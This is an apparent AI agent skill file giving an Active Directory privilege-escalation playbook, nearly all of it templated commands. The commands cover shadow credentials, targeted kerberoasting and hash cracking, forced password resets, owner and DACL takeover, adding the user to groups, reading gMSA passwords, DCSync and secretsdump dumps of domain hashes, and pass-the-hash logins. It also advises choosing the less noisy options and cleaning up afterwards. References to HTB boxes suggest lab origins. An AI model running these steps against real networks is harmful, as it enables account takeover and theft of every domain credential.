---
name: acl-abuse
description: Exploit Active Directory ACL misconfigurations including GenericAll, GenericWrite, WriteSPN, ForceChangePassword, WriteOwner, AddSelf, AddMember, ReadGMSAPassword, WriteDACL, or DCSync. Use when BloodHound shows an outbound edge from an owned user or when planning privilege escalation via AD permissions.
user-invocable: false
allowed-tools: Read
---

# ACL Abuse

## GenericAll / GenericWrite over user
Choose in this order: shadow cred → targeted kerberoast → password change
```bash
# Shadow credential (best — returns NT hash directly)
certipy shadow auto -u '{USER}@{DOMAIN}' -p '{PASS}' -account {TARGET} -dc-ip {IP}

# Targeted kerberoast
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object {TARGET} servicePrincipalName -v 'fake/spn'
netexec ldap {IP} -u '{USER}' -p '{PASS}' --kerberoasting kerb.txt
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object {TARGET} servicePrincipalName  # remove after
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt

# Password change (noisiest)
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set password {TARGET} 'NewPass123!'
```

## ForceChangePassword
```bash
# Check if disabled first
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} get object {TARGET} | grep userAccountControl
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object {TARGET} userAccountControl -v 512  # enable
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set password {TARGET} 'NewPass123!'
```

## WriteOwner → GenericAll
```bash
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set owner {TARGET_OBJ} {USER}
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} add genericAll {TARGET_OBJ} {USER}
```

## AddSelf / AddMember
```bash
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} add groupMember '{GROUP}' {USER}
```

## ReadGMSAPassword
```bash
netexec ldap {IP} -u '{USER}' -p '{PASS}' --gmsa
evil-winrm -i {IP} -u '{GMSA}$' -H {NT_HASH}
```

## WriteDACL on domain → DCSync (Forest pattern)
```bash
impacket-dacledit -action write -rights DCSync -principal '{USER}' -target-dn 'DC=x,DC=x' '{DOMAIN}/{USER}:{PASS}'
impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc
```

## WriteOwner/GenericAll on ADCS template → ESC4
See adcs skill for full flow.

## Backup Operators → NTDS.dit (Cicada pattern)
```bash
reg save HKLM\SAM C:\Temp\sam && reg save HKLM\SYSTEM C:\Temp\system
# Or diskshadow + robocopy for NTDS.dit
impacket-secretsdump -sam sam -system system LOCAL
```

## DCSync
```bash
impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc
impacket-secretsdump {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH} -just-dc
```

## Gotchas
- **Always try shadow cred first** when ADCS is present — avoids noisy password change
- **Check account status** before ForceChangePassword — disabled accounts need enabling
- **Remove fake SPN** after targeted kerberoast — leave environment clean
- **Backup Operators** → use diskshadow for NTDS.dit, not just registry hives

## Key References
- https://www.ired.team — AD attack mechanics
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- https://www.thehacker.recipes
- https://github.com/ly4k/Certipy/wiki — ADCS ESC1-16
- https://0xdf.gitlab.io — HTB AD writeups